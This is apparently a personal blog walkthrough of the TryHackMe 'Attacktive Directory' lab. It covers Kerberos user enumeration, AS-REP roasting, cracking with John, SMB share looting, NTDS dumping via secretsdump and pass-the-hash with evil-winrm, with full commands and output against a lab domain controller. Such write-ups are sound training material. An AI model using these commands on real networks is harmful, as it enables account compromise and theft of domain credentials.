---
title: "[THM] Attacktive Directory"
date: 2024-04-19T08:44:16+05:30
url: /attacktivedirectory-CTF/
categories:
  - Security
  - ctfs
  - Windows
  - networking
tags:
  - Windows
  - ActiveDirectory
  - tryhackme
draft: false
author: aayan
showauthor: false
showDateOnlyInArticle: false
showDateUpdated: true
showHeadingAnchors: false
showPagination: false
showReadingTime: true
showTableOfContents: true
showTaxonomies: true
showWordCount: true
sharingLinks: false
showEdit: false
showViews: false
showLikes: false
showSummary: true
summary: 99% of Corporate networks run off of AD. But can you exploit a vulnerable Domain Controller?
---


> Aayan Ta | 19th April, 2024 | 08:44 | Day 1 of attempting [Attacktive Directory](https://tryhackme.com/r/room/attacktivedirectory) 
## Attacktive Directory CTF

**Description: 99% of Corporate networks run off of AD. But can you exploit a vulnerable Domain Controller?**

### Task 1: Deploy The Machine
---

Target IP = 10.10.178.210


### Task 2: Setup
---

**Installing Impacket**

- **Using AUR**
```sh
yay -S blackarch/impacket-ba
```


**Using GitHub Releases**

```sh
wget https://github.com/fortra/impacket/releases/download/impacket_0_11_0/impacket-0.11.0.tar.gz && tar xvf impacket-0.11.0.tar.gz && cd impacket-0.11.0/examples/
```



**Check if impacket is installed correctly:**
`psexec.py -h`

**Available collection of Python classes for working with network protocols in Impacket**

```
addcomputer.py      getTGT.py             ntfs-read.py      services.py
atexec.py           GetUserSPNs.py        ntlmrelayx.py     smbclient.py
changepasswd.py     goldenPac.py          ping6.py          smbexec.py
dcomexec.py         karmaSMB.py           ping.py           smbpasswd.py
dpapi.py            keylistattack.py      psexec.py         smbrelayx.py
DumpNTLMInfo.py     kintercept.py         raiseChild.py     smbserver.py
esentutl.py         lookupsid.py          rbcd.py           sniffer.py
exchanger.py        machine_role.py       rdp_check.py      sniff.py
findDelegation.py   mimikatz.py           registry-read.py  split.py
GetADUsers.py       mqtt_check.py         reg.py            ticketConverter.py
getArch.py          mssqlclient.py        rpcdump.py        ticketer.py
Get-GPPPassword.py  mssqlinstance.py      rpcmap.py         tstool.py
GetNPUsers.py       net.py                sambaPipe.py      wmiexec.py
getPac.py           netview.py            samrdump.py       wmipersist.py
getST.py            nmapAnswerMachine.py  secretsdump.py    wmiquery.py
```

**Install Bloodhound and Neo4j**

```sh
yay -S bloodhound
```


### Task 3: Welcome to Attacktive Directory 
---

**Enumeration using nmap**

```bash
sudo nmap -v -sC -sV -oA nmap/attacktivedirectory 10.10.178.210
```

```sh
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2024-04-19 03:51:37Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 127
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 127
3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Issuer: commonName=AttacktiveDirectory.spookysec.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-04-18T03:22:11
| Not valid after:  2024-10-18T03:22:11
| MD5:   6859:fc45:c4bc:9629:3ae8:611a:7b4d:9ea8
| SHA-1: 81c0:e3c6:0144:716e:5931:5538:230e:9424:45b2:968a
| -----BEGIN CERTIFICATE-----
| MIIDCjCCAfKgAwIBAgIQRZYdLn3NkIhJZt7e8/qUDjANBgkqhkiG9w0BAQsFADAu
| MSwwKgYDVQQDEyNBdHRhY2t0aXZlRGlyZWN0b3J5LnNwb29reXNlYy5sb2NhbDAe
| Fw0yNDA0MTgwMzIyMTFaFw0yNDEwMTgwMzIyMTFaMC4xLDAqBgNVBAMTI0F0dGFj
| a3RpdmVEaXJlY3Rvcnkuc3Bvb2t5c2VjLmxvY2FsMIIBIjANBgkqhkiG9w0BAQEF
| AAOCAQ8AMIIBCgKCAQEAyKFhf9VzLoY8SL9d2gf4JG9kYlq6VEBliNiii8GP7NFk
| 2ciOXHBl9aKdxazPx2FUs/0ZgPdiFaUhs1ZMbgB32jWPeMzXiFkwTOh/UhpgNykG
| LQQ++x13B15QhfftCiUsFs/WZU1Hh/Nh+h8o/u2T02C2x8cu5i9o4Fv8Zk7s/78D
| 6fFDWBETHim62AnYqYY0OS8hXlbt68dTKx4cJBwXIk0iFDSvgm4xj18OqJY5rzTf
| DgeeKXgvRKOq3OVmsEELsUY73fAumfGcpZ3Y95ms/AmXtbibU4Gi+A9OXJTZ29gm
| e1Oa4LxzVdxQZ3Pb7enIKeU6ug/5VNh9JUm32CC/FQIDAQABoyQwIjATBgNVHSUE
| DDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBADA0
| iZ5GPmKnQJvoOPdHBChkeVIWp1HMrjpsbqioJdEr6hsbocCDWrTzDr161XUKMBzl
| zjG30yzLVFFI6GK6xeUvGQkB1kQBJgpYchs5ld9S9SSJSI6B72f+K3+Lfc6JOQDh
| srej7EcFNIwcliUF6DL2SehATa1xbOigQ1whQojQxcBk4CwEBUfLPLgogcxS9w4o
| wYfQWKa/n7wUn87eL44Bi6yhPVLoJQ/KG7aBN+NeSPy5RxZ0eeCeGSb8sXjJqbZh
| kFyeKwT44KmvT3MrRjq/KaxrTMPHS9DVxlvWTSvoSfrxhXBWPVRmWwmVpBMtJ+3J
| RDHIhMTIRDmU6X8uj4g=
|_-----END CERTIFICATE-----
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2024-04-19T03:51:49+00:00
|_ssl-date: 2024-04-19T03:51:57+00:00; -1s from scanner time.
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 0s, deviation: 0s, median: -1s
| smb2-time: 
|   date: 2024-04-19T03:51:49
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 51640/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 21261/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 20838/udp): CLEAN (Timeout)
|   Check 4 (port 29234/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
```


> Got 15 open ports using the all port scan

```bash
sudo nmap -v -sC -sV -p- -oA nmap/attacktivedirectory-all 10.10.178.210
```


**Open Ports:**

```sh
less nmap/attacktivedirectory-all.nmap | grep open
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-04-19 04:08:13Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp open  mc-nmf        .NET Message Framing
```

**Adding to /etc/hosts**

---

```sh
sudo vim /etc/hosts
```

```sh
10.10.178.210   AttacktiveDirectory.spookysec.local     spookysec.local
```

**Notes**: Flags for each user account are available for submission. You can retrieve the flags for user accounts via RDP (Note: the login format is spookysec.local\User at the Window's login prompt) and Administrator via Evil-WinRM.

**Questions**:
1. What tool will allow us to enumerate port 139/445?
	  - SMB ports 139 and 445
	  - `enum4linux`

2. What is the NetBIOS-Domain Name of the machine?
	  - `THM-AD`

3. What invalid TLD do people commonly use for their Active Directory Domain?
	- `.local` (spookysec.local)



### Task 4: Enumerating Users via Kerberos
---

- **Kerberos** is a key authentication service within Active Directory. 
- With this port open, we can use a tool called [Kerbrute](https://github.com/ropnop/kerbrute/releases) (by Ronnie Flathers @ropnop) to brute force discovery of users, passwords and even password spray!

or,

```sh
yay -S blackarch/kerbrute
```

**Enumeration:**

For this box, a modified [User List](https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt) and [Password List](https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt) will be used to cut down on time of enumeration of users and password hash cracking. 

It is **NOT** recommended to brute force credentials due to account lockout policies that we cannot enumerate on the domain controller.

**Here is what we do:**

- `wget` the usernames and passwords

- `kerbrute -h` 

- I did not know how to use this tool or how domain controllers work.


- `kerbrute userenum --dc "spookysec.local" -d "spookysec.local" -v -o kerb_userenum userlist.txt | grep "VALID USERNAME"`

**Got these valid users as a Result**:
```sh
2024/04/19 10:15:18 >  [+] VALID USERNAME:       james@spookysec.local
2024/04/19 10:15:22 >  [+] VALID USERNAME:       svc-admin@spookysec.local
2024/04/19 10:15:26 >  [+] VALID USERNAME:       James@spookysec.local
2024/04/19 10:15:27 >  [+] VALID USERNAME:       robin@spookysec.local
2024/04/19 10:15:39 >  [+] VALID USERNAME:       darkstar@spookysec.local
2024/04/19 10:15:49 >  [+] VALID USERNAME:       administrator@spookysec.local
2024/04/19 10:16:09 >  [+] VALID USERNAME:       backup@spookysec.local
2024/04/19 10:16:16 >  [+] VALID USERNAME:       paradox@spookysec.local
2024/04/19 10:17:15 >  [+] VALID USERNAME:       JAMES@spookysec.local
2024/04/19 10:17:31 >  [+] VALID USERNAME:       Robin@spookysec.local
```



**Questions**:
1. What command within Kerbrute will allow us to enumerate valid usernames?
	- `userenum`

2. What notable account is discovered? (These should jump out at you)
	- `svc-admin`
		- kerbrute result

3. What is the other notable account is discovered? (These should jump out at you)
	- `backup`


---

> Aayan Ta | 27th April, 2024 | 20:00 | Day 2 of attempting [Attacktive Directory](https://tryhackme.com/r/room/attacktivedirectory) 


---

### Task 5: Abusing Kerberos
---

Target IP = 10.10.60.39 (day 2)

**AS-REP Roasting Attack**
- **Overview**: AS-REP Roasting exploits the "Does not require Pre-Authentication" setting in Kerberos. This setting allows querying for a Kerberos Ticket without initial verification.


- **Tool**: Impacket's **GetNPUsers.py**

```sh
usage: GetNPUsers.py [-h] [-request] [-outputfile OUTPUTFILE] [-format {hashcat,john}] [-usersfile USERSFILE] [-ts] [-debug]                                                              
                     [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address] [-dc-host hostname]                                                                    
                     target   
```

**Command**: 
```sh
GetNPUsers.py -usersfile userlist.txt -request -format hashcat -outputfile ASREProastables.txt -dc-ip 10.10.60.39 'spookysec.local/'
```

**Result:**

```sh
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:9b7fd4870a23d1ab68f96e137455acd0$a25bf247ad52b323da8a9e6560e9fd9095e50225c8fbc1af135a180d4253b841b3ae386bc84da2215c448e2c25357227df45291264aa4cb3be18610eaa148f6e6340148af96b523361bab0a59c043687f51130d12cfaff4bfed5f7afd3f73efb5a618aacafd2ec547f689fee3e76af935d35a9702b23a16db659f25aba0a14190437682f59f25cabf0c2dfcd76e49107c17bb57dd218e514df898ee1a3c544513fa4cc1399afbf29e85aba5e20e6f6680503263128b2e6a6a4e759a90cd62fadb6a297d0578cfa509fd3caa5095e93c9b9718015fce9ca4af314253dc7a5010f27ce6eddd448f7ce374abf6e9e3e974e9235
```

- Visiting [Hashcat Wiki](https://hashcat.net/wiki/doku.php?id=example_hashes) to identify the hash type. It's **"Kerberos 5, etype 23, AS-REP"**


| Hash-Mode | Hash-Name                        | Example                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| :-------- | :------------------------------- | :---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 18200     | **Kerberos 5, etype 23, AS-REP** | `$krb5asrep$23$user@domain.com:3e156ada591263b8aab0965f5aebd837$007497cb51b6c8116d6407a782ea0e1c5402b17db7afa6b05a6d30ed164a9933c754d720e279c6c573679bd27128fe77e5fea1f72334c1193c8ff0b370fadc6368bf2d49bbfdba4c5dccab95e8c8ebfdc75f438a0797dbfb2f8a1a5f4c423f9bfc1fea483342a11bd56a216f4d5158ccc4b224b52894fadfba3957dfe4b6b8f5f9f9fe422811a314768673e0c924340b8ccb84775ce9defaa3baa0910b676ad0036d13032b0dd94e3b13903cc738a7b6d00b0b3c210d1f972a6c7cae9bd3c959acf7565be528fc179118f28c679f6deeee1456f0781eb8154e18e49cb27b64bf74cd7112a0ebae2102ac` |

**Crack the password hash using Hashcat:** (Errors)

```
hashcat --hash-type 18200 --attack-mode 0 ASREProastables.txt passwordlist.txt
```

I tried installing `xf86-video-amdgpu`, and `rocm-opencl-runtime`, hashcat binary.

**Hashcat doesn't work at all !!!**

Let's use **John**:

```sh
john --wordlist=passwordlist.txt ASREProastables-john.txt
```

**Result:**

```sh

Warning: detected hash type "krb5asrep", but the string is also recognized as "krb5asrep-aes-opencl"
Use the "--format=krb5asrep-aes-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
management2005   ($krb5asrep$svc-admin@SPOOKYSEC.LOCAL)
1g 0:00:00:00 DONE (2024-04-27 22:35) 50.00g/s 384000p/s 384000c/s 384000C/s horoscope..tyler2
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```




**Questions:**
1. We have two user accounts that we could potentially query a ticket from. Which user account can you query a ticket from with no password?
	- `svc-admin`

2. Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC? (Specify the full name)
	- `Kerberos 5, etype 23, AS-REP` 

3. What mode is the hash?
	- `18200`

4. Now crack the hash with the modified password list provided, what is the user accounts password?
	- `management2005`


### Task 6: Back to the Basics
---


**Enumeration using smbclient:**

```sh
smbclient -L 10.10.60.39 -U svc-admin
# password: management2005
```

**Result:**
```sh
Can't load /etc/samba/smb.conf - run testparm to debug it
Password for [WORKGROUP\svc-admin]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backup          Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
```

**Which shares can we access?**

```sh
smbclient //10.10.60.39/backup -U svc-admin --password=management2005
```

**Contents of backup:**

```sh
smb: \> ls
smb: \> get backup_credentials.txt 
cat backup_credentials.txt
# YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
```

Decoding the above string using base64 gives, 

`backup@spookysec.local:backupxxx7860`



**Questions:**

1. What utility can we use to map remote SMB shares?
	- `smbclient`

2. Which option will list shares?
	- `-L`

3. How many remote shares is the server listing?
	- `6`

4. There is one particular share that we have access to that contains a text file. Which share is it?
	- `backup`

5. What is the content of the file?
	- `YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw`

6. Decoding the contents of the file, what is the full contents?
	- `backup@spookysec.local:backupxxx7860`



### Task 7: Elevating Privileges within the Domain
---

**Domain Privilege Escalation**

- The "backup" user account is directly associated with the Domain Controller.
- It holds a critical permission allowing it to sync all Active Directory changes, including password hashes.


```sh
secretsdump.py backup@spookysec.local
```

**Result:**

![Hashes](https://github.com/Incident-Clarity/incident-clarity-assets/blob/main/pix/web_assets/attacktivedirectory-THM-hashes.png?raw=true)


**Questions:**
1. What method allowed us to dump NTDS.DIT?
	- `DRSUAPI`
		- Top of the result `[*] Using the DRSUAPI method to get NTDS.DIT secrets`

2. What is the Administrators NTLM hash?
	- `0exxxxxxxxxxxxxxxxxxxxxxxxxxxfc`
		- Credentials format: (domain\uid:rid:lmhash:nthash)

3. What method of attack could allow us to authenticate as the user without the password?
	- `Pass the hash` 
		- hacking technique that allows an attacker to authenticate to a remote server or service by using the underlying NTLM or LanMan hash of a user’s password.

4. Using a tool called Evil-WinRM what option will allow us to use a hash?
	- `-H`


### Task 8: Flag Submission Panel
---

**Evil-WinRM**

Evil-WinRM is a powerful Windows Remote Management (WinRM) shell uses PowerShell for remote administration and control of Windows hosts, from enumeration to execution.

**Command:**
```sh
evil-winrm -i 10.10.60.39 -u Administrator -H 0exxxxxxxxxxxxxxfc
```

**Result:**
```sh
*Evil-WinRM* PS C:\Users\Administrator\Desktop> Get-Content "C:/Users/Administrator/Desktop/root.txt"
TryHackMe{4cxxxxxxxxxxxxxx3r}
```


**Questions:**

1. svc-admin
	- `TryHackMe{Kxxxxxxxxxxxxxh}`


2. backup
	- `TryHackMe{Bxxxxxxxxxxxxy!}`


3. Administrator
	- `TryHackMe{4cxxxxxxxxxxt3r}`


## Cleaning System Up
---


- [x] `yay -Rsndd evil-winrm john kerbrute bloodhound impacket-ba`

